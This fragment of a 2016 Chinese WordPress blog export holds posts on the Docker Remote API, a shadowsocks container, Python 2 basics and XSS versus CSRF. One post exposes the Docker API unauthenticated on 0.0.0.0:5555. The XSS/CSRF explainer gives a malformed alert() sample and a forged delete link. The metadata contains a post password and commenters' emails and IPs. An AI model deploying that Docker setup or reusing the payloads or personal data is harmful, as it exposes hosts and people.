		<wp:post_date_gmt><![CDATA[2016-05-25 13:07:07]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%85%a5%e4%be%b5%e6%9f%90%e7%bd%91%e7%ab%99%e5%85%a8%e8%bf%87%e7%a8%8b]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[hzy2014120013]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="linux"><![CDATA[Linux]]></category>
		<category domain="post_tag" nicename="%e5%85%a5%e4%be%b5"><![CDATA[入侵]]></category>
		<category domain="category" nicename="%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f"><![CDATA[操作系统]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[227]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>开启Docker Remote API</title>
		<link>https://www.nervgeek.com/2016/05/25/%e5%bc%80%e5%90%afdocker-remote-api/</link>
		<pubDate>Wed, 25 May 2016 13:14:16 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1228</guid>
		<description></description>
		<content:encoded><![CDATA[一直使用ss-link家的VPN，总感觉他们应该是使用了docker来即时部署环境，容器内部端口绑定物理机外部端口，然后把ip、端口、账号密码分发给用户。
我也打算用docker实现一下，所以要开启Docker Remote API来让web来控制docker的增删改查。
在<strong>/etc/default/docker</strong>里，添加<code>DOCKER_OPTS="-H tcp://0.0.0.0:5555 -H unix:///var/run/docker.sock"</code>
5555只是我使用的端口号，可以更换为其他端口。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/WTIH6IL4VJ9RC2J0L.png"><img class="alignnone size-full wp-image-1238" src="https://www.nervgeek.com/wp-content/uploads/2016/05/WTIH6IL4VJ9RC2J0L.png" alt="WT~IH6IL4V%J~)9))RC2J0L" width="1441" height="891" /></a>
重启docker服务，使用curl或者浏览器访问http://你的ip地址:5555/info，可以看到相关信息。
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1228</wp:post_id>
		<wp:post_date><![CDATA[2016-05-25 21:14:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-25 13:14:16]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%bc%80%e5%90%afdocker-remote-api]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="api"><![CDATA[api]]></category>
		<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[277]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>31</wp:comment_id>
			<wp:comment_author><![CDATA[Mr9esx]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[1138099359@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[113.104.33.91]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-27 23:44:47]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-27 15:44:47]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[:a8:]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>1</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>在Docker中下载、启动有shadowsocks代理的镜像</title>
		<link>https://www.nervgeek.com/2016/05/25/%e5%9c%a8docker%e4%b8%ad%e4%b8%8b%e8%bd%bd%e3%80%81%e5%90%af%e5%8a%a8%e6%9c%89shadowsocks%e4%bb%a3%e7%90%86%e7%9a%84%e9%95%9c%e5%83%8f/</link>
		<pubDate>Wed, 25 May 2016 13:44:22 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1240</guid>
		<description></description>
		<content:encoded><![CDATA[测试环境是阿里云的云服务器，目标是成功把ip更改为服务器的ip，即为代理成功。
服务器系统：<strong>ubuntu 14.10 64位</strong>
Docker信息：

<table style="border: 2;">
<tbody>
<tr>
<td>Client:
Version: 1.11.1
API version: 1.23
Go version: go1.5.4
Git commit: 5604cbe
Built: Tue Apr 26 23:30:23 2016
OS/Arch: linux/amd64</td>
<td>Server:
Version: 1.11.1
API version: 1.23
Go version: go1.5.4
Git commit: 5604cbe
Built: Tue Apr 26 23:30:23 2016
OS/Arch: linux/amd64</td>
</tr>
</tbody>
</table>

在https://hub.alauda.cn里找shadowsocks的镜像，ubuntu用dubuqingfeng/ubuntu-shadowsocks的镜像，另外还有centos版本。
接下来就是命令实战部分。
输入： <code>docker pull index.alauda.cn/dubuqingfeng/ubuntu-shadowsocks:vps</code> 把镜像下载回来。
接着输入：docker <span class="hljs-built_ins">run</span> -d -p 1984:1984 index.alauda.cn/dubuqingfeng/ubuntu-shadowsocks:vps -p 1984 -k sspassword -m aes-256-cfb。
-p 1984:1984代表把容器内部的1984端口映射到外部服务器的1984端口，<strong>前面的1984是外部服务器的端口，后面的1984是容器内部的端口。</strong>
后面的-p 1984代表开启1984端口，-k sspassword是设置shadowsocks的链接密码，-m aes-256-cfb是其传输加密方式。

<pre>root@NervGeek:~# docker run -d -p 1984:1984 index.alauda.cn/dubuqingfeng/ubuntu-shadowsocks:vps -p 1984 -k sspassword -m aes-256-cfb
507c86a4d412d10fef5e91bf109139141aedcb702d0d63289cce3c225b3ca80a</pre>

执行之后，使用docker ps查看。

<table style="height: 126px;">
<tbody>
<tr style="height: 58px;">
<td style="width: 116px; height: 58px;">CONTAINER ID</td>
<td style="width: 10.8px; height: 58px;">IMAGE</td>
<td style="width: 10px; height: 58px;">COMMAND</td>
</tr>
<tr style="height: 88.2001px;">
<td style="width: 116px; height: 88.2001px;">507c86a4d412</td>
<td style="width: 10.8px; height: 88.2001px;">index.alauda.cn/dubuqingfeng/ubuntu-shadowsocks:vps</td>
<td style="width: 10px; height: 88.2001px;">"/usr/local/bin/ssser"</td>
</tr>
</tbody>
</table>

<table>
<tbody>
<tr>
<td>CREATED</td>
<td>STATUS</td>
<td>PORTS</td>
<td>NAMES</td>
</tr>
<tr>
<td>2 seconds ago</td>
<td>Up 2 seconds</td>
<td>0.0.0.0:1984-&gt;1984/tcp, 8388/tcp</td>
<td>romantic_ramanujan</td>
</tr>
</tbody>
</table>

还可以使用 <code>docker logs <strong>CONTAINER ID</strong></code> 查看：

<pre>2016-05-25 13:26:41 INFO loading libcrypto from libcrypto.so.1.0.0
2016-05-25 13:26:41 INFO starting server at 0.0.0.0:1984</pre>

发现正常启动！
https://blog.ss-link.com/dl/Windows/里下载ss代理软件，2.5.8即可，填写好信息。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/9INXA7VY3KUTJSRV0RA.png"><img class="alignnone size-full wp-image-1241" src="https://www.nervgeek.com/wp-content/uploads/2016/05/9INXA7VY3KUTJSRV0RA.png" alt="9]%INXA~7V%Y3KUTJSRV0RA" width="578" height="387" /></a>
&nbsp;
最后，在百度查询ip：
<a href="https://www.nervgeek.com/wp-content/uploads/2016/05/7M5KHVS7ZSGWH1L3GBYNH.png"><img class="alignnone size-full wp-image-1242" src="https://www.nervgeek.com/wp-content/uploads/2016/05/7M5KHVS7ZSGWH1L3GBYNH.png" alt="7M5KHVS&#96;7ZSGWH1L3GBY%NH" width="1779" height="1162" /></a>
代理成功！]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1240</wp:post_id>
		<wp:post_date><![CDATA[2016-05-25 21:44:22]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-25 13:44:22]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e5%9c%a8docker%e4%b8%ad%e4%b8%8b%e8%bd%bd%e3%80%81%e5%90%af%e5%8a%a8%e6%9c%89shadowsocks%e4%bb%a3%e7%90%86%e7%9a%84%e9%95%9c%e5%83%8f]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="docker"><![CDATA[Docker]]></category>
		<category domain="post_tag" nicename="shadowsocks"><![CDATA[shadowsocks]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e8%bd%af%e4%bb%b6%e5%ba%94%e7%94%a8"><![CDATA[软件应用]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_738d3a77341a2683f56fcd15c4d9cff1]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_bfd8bae8a392040c068cd037c160384b]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[421]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_68f660574d243bcacc18dcba3de33bc7]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_c53c1ee2b6a0f07e45a042294e4aef11]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_oembed_6ae0f01896bb69b558f408c4f9a70036]]></wp:meta_key>
		<wp:meta_value><![CDATA[{{unknown}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>懒癌万岁，五月病万岁。</title>
		<link>https://www.nervgeek.com/2016/05/25/%e6%87%92%e7%99%8c%e4%b8%87%e5%b2%81%ef%bc%8c%e4%ba%94%e6%9c%88%e7%97%85%e4%b8%87%e5%b2%81%e3%80%82/</link>
		<pubDate>Wed, 25 May 2016 14:27:45 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1245</guid>
		<description></description>
		<content:encoded><![CDATA[<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/35f4a8d465e6e1edc05f3d8ab658c551.png"><img class="alignnone size-full wp-image-1149" src="https://www.nervgeek.com/wp-content/uploads/2016/03/35f4a8d465e6e1edc05f3d8ab658c551.png" alt="35f4a8d465e6e1edc05f3d8ab658c551" width="35" height="36" /></a>发现自己都大半个月没怎么写文章了，最近这两个月虽然学了不少东西，Bootstrap啊，一堆JS库啊，还打算把python和安卓也搞一下啊，但学归学了，总是懒得把笔记写到博客上。
<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/fbd7939d674997cdb4692d34de8633c4.png"><img class="alignnone size-full wp-image-1141" src="https://www.nervgeek.com/wp-content/uploads/2016/03/fbd7939d674997cdb4692d34de8633c4.png" alt="fbd7939d674997cdb4692d34de8633c4" width="46" height="33" /></a>但最近也是比较多逼事，也想摸多几把DotA2，就把博客给落下了。不过一个月前把WordPress升级到4.5.1，顺便学了下子主题，再也不怕每次更新之后主题样式都变了。
不过该博客还是会时不时更新几篇学习心得的，<a href="https://www.nervgeek.com/wp-content/uploads/2016/03/a5771bce93e200c36f7cd9dfd0e5deaa.png"><img class="alignnone size-full wp-image-1135" src="https://www.nervgeek.com/wp-content/uploads/2016/03/a5771bce93e200c36f7cd9dfd0e5deaa.png" alt="a5771bce93e200c36f7cd9dfd0e5deaa" width="33" height="30" /></a>虽然我知道这破博客也没什么人来看。
对了，最近循环One Ok Rock的歌，给大家安利下。还有6月18日是AKB第八届总选举，希望大家关注一下。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1245</wp:post_id>
		<wp:post_date><![CDATA[2016-05-25 22:27:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-25 14:27:45]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%87%92%e7%99%8c%e4%b8%87%e5%b2%81%ef%bc%8c%e4%ba%94%e6%9c%88%e7%97%85%e4%b8%87%e5%b2%81%e3%80%82]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="other"><![CDATA[Other]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[1246]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[214]]></wp:meta_value>
		</wp:postmeta>
							<wp:comment>
			<wp:comment_id>32</wp:comment_id>
			<wp:comment_author><![CDATA[Linux]]></wp:comment_author>
			<wp:comment_author_email><![CDATA[10000@qq.com]]></wp:comment_author_email>
			<wp:comment_author_url></wp:comment_author_url>
			<wp:comment_author_IP><![CDATA[123.103.8.103]]></wp:comment_author_IP>
			<wp:comment_date><![CDATA[2016-05-30 11:55:44]]></wp:comment_date>
			<wp:comment_date_gmt><![CDATA[2016-05-30 03:55:44]]></wp:comment_date_gmt>
			<wp:comment_content><![CDATA[知道就好]]></wp:comment_content>
			<wp:comment_approved><![CDATA[1]]></wp:comment_approved>
			<wp:comment_type><![CDATA[]]></wp:comment_type>
			<wp:comment_parent>0</wp:comment_parent>
			<wp:comment_user_id>0</wp:comment_user_id>
							</wp:comment>
					</item>
					<item>
		<title>Python语法学习</title>
		<link>https://www.nervgeek.com/2016/05/28/python%e8%af%ad%e6%b3%95%e5%ad%a6%e4%b9%a0/</link>
		<pubDate>Sat, 28 May 2016 15:35:34 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1280</guid>
		<description></description>
		<content:encoded><![CDATA[花了十来分钟看了下python的基本语法。把大概特征都用了一下。
用的是python的2.7版本，有个比较经典的问题就是中文输出出现乱码甚至程序报错。
我设置了 <code>-*- coding: utf-8 -*-</code> 虽然没有程序报错，但中文还是乱码，所以使用了 <code>type = sys.getfilesystemencoding()</code> 获取了系统编码，然后用UTF-8解码再用系统的解码编码，解决了乱码的问题。

<pre># -*- coding: utf-8 -*-
# day 1
import sys
#解决中文输出乱码
type = sys.getfilesystemencoding()
string="Hello World！您好 世界！"
print string.decode('UTF-8').encode(type)
#多行语句
total = 2016 + \
 5 + \
 28
print total;
'''
多行注释
'''
"""
多行注释
"""
#用户输入
raw_input("\n\nPress the enter key to exit.\n\n")
#多条语句
print "第一条".decode('UTF-8').encode(type);print "第二条".decode('UTF-8').encode(type)
print "\n"
#变量
#和Javascript类似，不需要定义任何类型，连声明这是变量都不需要。
print "变量".decode('UTF-8').encode(type)
item1 = 1
item2 = 3.14
item3 = "123456789101112.9999999999999"
print item1,item2,item3
#多变量赋值，常用于初始化
item4 = item5 = item6 = 10
print item4,item5,item6
print "\n"
'''
python有五种数据类型
Numbers（数字）
String（字符串）
List（列表）
Tuple（元组）
Dictionary（字典）
'''
'''
python有四种不同的数字类型
int（有符号整型）
long（长整型[也可以代表八进制和十六进制]）
float（浮点型）
complex（复数）
'''
#数字
print "数字".decode('UTF-8').encode(type)
var1 = 10
print var1
#使用del关键字可以删除对象
del var1
#print var1;#会报错，提示NameError: name 'var1' is not defined
print "\n"
#字符串
print "字符串".decode('UTF-8').encode(type)
str = 'Hello World!'
print str # 输出完整字符串
print str[0] # 输出字符串中的第一个字符
print str[2:5] # 输出字符串中第三个至第五个之间的字符串
print str[2:] # 输出从第三个字符开始的字符串
print str * 2 # 输出字符串两次
print str + "TEST" # 输出连接的字符串
print "\n"
#列表
list = [ 'abcd', 786 , 2.23, 'john', 70.2 ]
tinylist = [123, 'john']
print "列表".decode('UTF-8').encode(type)
print list # 输出完整列表
print list[0] # 输出列表的第一个元素
print list[1:3] # 输出第二个至第三个的元素
print list[2:] # 输出从第三个开始至列表末尾的所有元素
print tinylist * 2 # 输出列表两次
print list + tinylist # 打印组合的列表
print "\n"
#元字典
print "元字典".decode('UTF-8').encode(type)
dict = {}
dict['one'] = "This is one"
dict[2] = "This is two"
tinydict = {'name': 'john','code':6734, 'dept': 'sales'}
print dict['one'] # 输出键为'one' 的值
print dict[2] # 输出键为 2 的值
print tinydict # 输出完整的字典
print tinydict.keys() # 输出所有键
print tinydict.values() # 输出所有值</pre>

<!--more-->
输出结果：

<pre>C:\Users\Mr9esx\Desktop\python&gt;day1.py
Hello World！您好 世界！
2049
Press the enter key to exit.
第一条
第二条
变量
1 3.14 123456789101112.9999999999999
10 10 10
数字
10
字符串
Hello World!
H
llo
llo World!
Hello World!Hello World!
Hello World!TEST
列表
['abcd', 786, 2.23, 'john', 70.2]
abcd
[786, 2.23]
[2.23, 'john', 70.2]
[123, 'john', 123, 'john']
['abcd', 786, 2.23, 'john', 70.2, 123, 'john']
元字典
This is one
This is two
{'dept': 'sales', 'code': 6734, 'name': 'john'}
['dept', 'code', 'name']
['sales', 6734, 'john']</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1280</wp:post_id>
		<wp:post_date><![CDATA[2016-05-28 23:35:34]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-28 15:35:34]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[python%e8%af%ad%e6%b3%95%e5%ad%a6%e4%b9%a0]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="python"><![CDATA[Python]]></category>
		<category domain="post_tag" nicename="python"><![CDATA[python]]></category>
		<category domain="post_tag" nicename="%e5%ad%a6%e4%b9%a0"><![CDATA[学习]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="post_tag" nicename="%e7%bc%96%e7%a8%8b"><![CDATA[编程]]></category>
		<category domain="post_tag" nicename="%e8%af%ad%e6%b3%95"><![CDATA[语法]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_music_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[xiami]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[mp3_xiami_type]]></wp:meta_key>
		<wp:meta_value><![CDATA[song]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[wp_player_lyric_open]]></wp:meta_key>
		<wp:meta_value><![CDATA[close]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[views]]></wp:meta_key>
		<wp:meta_value><![CDATA[226]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>XSS 与 CSRF 的区别</title>
		<link>https://www.nervgeek.com/2016/05/31/xss-%e4%b8%8e-csrf-%e7%9a%84%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Tue, 31 May 2016 06:54:41 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=1282</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>先把总结放在前面，<strong>XSS只是实现CSRF的其中一个途径，CSRF可以有多种方法实现。</strong></blockquote>

<strong><span style="font-size: 18pt;">XSS</span></strong>
XSS漏洞最常见的是<strong>存储型XSS</strong>，在一些网站可以允许用户输入文字的地方，例如发表文章时的标题、文章内容以及个人信息的输入框，假如后台没有对用户输入的数据进行一些过滤，有可能就造成XSS攻击。
例如我在文章标题输入 <code>&lt;javascript&gt;alert("ok!")&lt;/javascript&gt;</code> ，后台直接把原本的数据存进了数据库，当其他人打开该文章时，会弹出一个对话框。
但JS脚本可以做的事更多，我们可以使用js获取到cookie，即使该网站使用的是session，我们也可以获取到sessionid。
<strong>XSS攻击的威力，取决于用户输入了什么样的脚本。</strong>
除了<strong>存储型XSS</strong>，还有<strong>反射型XSS</strong>。
<!--more-->

<h2><span style="font-size: 18pt;"><strong>CSRF</strong></span></h2>

CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。
你这可以这么理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求。CSRF能够做的事情包括：以你名义发送邮件，发消息，盗取你的账号，甚至于购买商品，虚拟货币转账......造成的问题包括：个人隐私泄露以及财产安全。

<h3><span style="font-size: 14pt;">CSRF漏洞现状</span></h3>

<span style="font-size: 14pt;">CSRF这种攻击方式在2000年已经被国外的安全人员提出，但在国内，直到06年才开始被关注，08年，国内外的多个大型社区和交互网站分别爆出CSRF漏洞，如：NYTimes.com（纽约时报）、Metafilter（一个大型BLOG网站），YouTube和百度HI......而现在，互联网上的许多站点仍对此毫无防备，以至于安全业界称CSRF为“沉睡的巨人”。</span>

<h3><span style="font-size: 14pt;">原理</span></h3>

<p style="padding-left: 30px;"><span style="font-size: 14pt;">网站A ：为恶意网站。</span></p>

<p style="padding-left: 30px;"><span style="font-size: 14pt;">网站B ：用户已登录的网站。</span></p>

<p style="padding-left: 30px;"><span style="font-size: 14pt;">当用户访问 A站 时，A站 私自访问 B站 的操作链接，模拟用户操作。</span></p>

<p style="padding-left: 30px;"><span style="font-size: 14pt;">假设B站有一个删除评论的链接：http://b.com/comment/?type=delete&amp;id=81723</span></p>

<p style="padding-left: 30px;"><span style="font-size: 14pt;">A站 直接访问该链接，就能删除用户在 B站 的评论。</span></p>

<h3><span style="font-size: 14pt;">CSRF 防御技巧</span></h3>

<h3><span style="font-size: 14pt;">1.验证码</span></h3>

<span style="font-size: 14pt;">几乎所有人都知道验证码，但验证码不单单用来防止注册机的暴力破解，还可以有效防止CSRF的攻击。验证码算是对抗CSRF攻击最简洁有效的方法。但使用验证码的问题在于，不可能在用户的所有操作上都需要输入验证码.只有一些关键的操作，才能要求输入验证码。不过随着HTML5的发展。利用canvas标签，前端也能识别验证码的字符，让CSRF生效。</span>
<strong><span style="font-size: 14pt;">2.Token</span></strong>
<span style="font-size: 14pt;">CSRF能攻击成功，根本原因是：操作所带的参数均被攻击者猜测到。既然知道根本原因，我们就对症下药，利用Token。当向服务器传参数时，带上Token。这个Token是一个随机值，并且由服务器和用户同时持有。当用户提交表单时带上Token值，服务器就能验证表单和session中的Token是否一致。</span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>1282</wp:post_id>
		<wp:post_date><![CDATA[2016-05-31 14:54:41]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2016-05-31 06:54:41]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[xss-%e4%b8%8e-csrf-%e7%9a%84%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="csrf"><![CDATA[CSRF]]></category>
		<category domain="post_tag" nicename="xss"><![CDATA[XSS]]></category>
		<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
		<category domain="category" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
		<category domain="post_tag" nicename="%e7%bd%91%e7%bb%9c%e5%ae%89%e5%85%a8"><![CDATA[网络安全]]></category>
						<wp:postmeta>
